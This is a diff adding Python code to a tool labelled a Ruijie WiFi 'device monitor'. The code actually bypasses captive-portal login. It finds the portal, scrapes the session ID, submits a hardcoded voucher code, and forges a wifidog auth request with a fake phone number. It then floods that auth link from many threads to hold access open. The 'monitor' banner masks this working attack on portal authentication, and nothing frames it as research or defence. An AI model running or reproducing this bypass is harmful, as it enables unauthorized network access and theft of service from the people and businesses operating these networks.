@@ -524,7 +524,171 @@ def status_display():
                     graph = f"{RED}✗{RESET}"
                 
                 print(f"  {time_str}  {ms_color}{ms_str:>6}{RESET}  {graph}")
-     # ===============================
+        
+        print(f"""
+{BOLD}{CYAN}╚══════════════════════════════════════════════════════════════════════╝{RESET}
+{DIM}Real Device Data • Real Network Info • Real Ping • {time.strftime('%Y-%m-%d %H:%M:%S')}{RESET}
+""")
+        
+        time.sleep(1)
+
+# ===============================
+# MAIN CONNECTION FUNCTION
+# ===============================
+
+def start_connection():
+    """Main connection function with real data collection"""
+    global connection_info
+    
+    print(f"{CYAN}[*] Collecting real device information...{RESET}")
+    get_real_device_info()
+    get_real_network_interfaces()
+    get_real_gateway_info()
+    get_real_dns_servers()
+    
+    session = requests.Session()
+    test_url = "http://connectivitycheck.gstatic.com/generate_204"
+    
+    while not stop_event.is_set():
+        try:
+            r = requests.get(test_url, allow_redirects=True, timeout=5)
+            
+            # Check if already connected to internet
+            if r.url == test_url:
+                try:
+                    requests.get("http://www.google.com", timeout=2)
+                    with lock:
+                        connection_info['connected'] = True
+                    time.sleep(5)
+                    continue
+                except:
+                    pass
+            
+            # Found captive portal
+            portal_url = r.url
+            parsed_portal = urlparse(portal_url)
+            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
+            
+            print(f"\n{GREEN}[+] Real Captive Portal Found: {portal_url}{RESET}")
+            
+            # Get session ID
+            r1 = session.get(portal_url, verify=False, timeout=10)
+            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            r2 = session.get(next_url, verify=False, timeout=10)
+            
+            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+            if not sid:
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+                sid = sid_match.group(1) if sid_match else None
+            
+            if sid:
+                # Try voucher API
+                voucher_api = f"{portal_host}/api/auth/voucher/"
+                try:
+                    v_res = session.post(voucher_api, 
+                                       json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, 
+                                       timeout=3)
+                    print(f"{GREEN}[+] Voucher API: {v_res.status_code}{RESET}")
+                except:
+                    print(f"{YELLOW}[!] Voucher API not required{RESET}")
+                
+                # Get gateway info
+                params = parse_qs(parsed_portal.query)
+                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+                gw_port = params.get('gw_port', ['2060'])[0]
+                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
+                
+                # Get real gateway info
+                gateway_mac = discover_gateway_mac(gw_addr)
+                gateway_model = identify_gateway_model(gw_addr, gw_port)
+                
+                with lock:
+                    connection_info['connected'] = True
+                    connection_info['session_id'] = sid
+                    connection_info['gateway_ip'] = gw_addr
+                    connection_info['gateway_port'] = gw_port
+                    connection_info['gateway_mac'] = gateway_mac
+                    connection_info['gateway_model'] = gateway_model
+                    connection_info['start_time'] = time.time()
+                
+                print(f"{GREEN}[+] Session ID: {YELLOW}{sid}{RESET}")
+                print(f"{GREEN}[+] Gateway: {CYAN}{gw_addr}:{gw_port}{RESET}")
+                print(f"{GREEN}[+] Gateway MAC: {DIM}{gateway_mac}{RESET}")
+                print(f"{GREEN}[+] Gateway Model: {WHITE}{gateway_model}{RESET}")
+                
+                # Start ping threads
+                print(f"{MAGENTA}[*] Starting {PING_THREADS} real ping threads...{RESET}")
+                for _ in range(PING_THREADS):
+                    t = threading.Thread(target=real_ping_thread, 
+                                        args=(auth_link, sid), 
+                                        daemon=True)
+                    t.start()
+                
+                # Monitor connection
+                while not stop_event.is_set():
+                    try:
+                        requests.get("http://www.google.com", timeout=2)
+                        time.sleep(5)
+                    except:
+                        print(f"{YELLOW}[!] Connection lost!{RESET}")
+                        with lock:
+                            connection_info['connected'] = False
+                        break
+                        
+        except Exception as e:
+            if not stop_event.is_set():
+                time.sleep(2)
+
+# ===============================
+# MAIN FUNCTION
+# ===============================
+
+def main():
+    """Main entry point"""
+    try:
+        # Check requirements
+        required_packages = ['netifaces', 'psutil']
+        for package in required_packages:
+            try:
+                __import__(package)
+            except ImportError:
+                print(f"{YELLOW}[!] Installing {package}...{RESET}")
+                os.system(f'pip install {package}')
+        
+        os.system('clear' if os.name == 'posix' else 'cls')
+        
+        print(f"""
+{BOLD}{GREEN}╔══════════════════════════════════════════════════════════════════╗
+║                                                                      ║
+║           REAL DEVICE MONITOR FOR RUIJIE WIFI v5.0                  ║
+║                                                                      ║
+║           • Real Device Info    • Real Gateway Info                 ║
+║           • Real WiFi SSID      • Real Ping Times                    ║
+║           • Real MAC Addresses  • Real Signal Strength              ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝{RESET}
+""")
+        
+        time.sleep(2)
+        
+        # Start status display
+        status_thread = threading.Thread(target=status_display, daemon=True)
+        status_thread.start()
+        
+        # Start connection
+        start_connection()
+        
+    except KeyboardInterrupt:
+        print(f"\n{YELLOW}[!] Shutting down...{RESET}")
+        stop_event.set()
+        time.sleep(1)
+        print(f"{GREEN}[+] Clean exit{RESET}")
+        sys.exit(0)
+
+if __name__ == "__main__":
+    main()
+# ===============================
 # KEY APPROVAL SYSTEM
 # ===============================
 
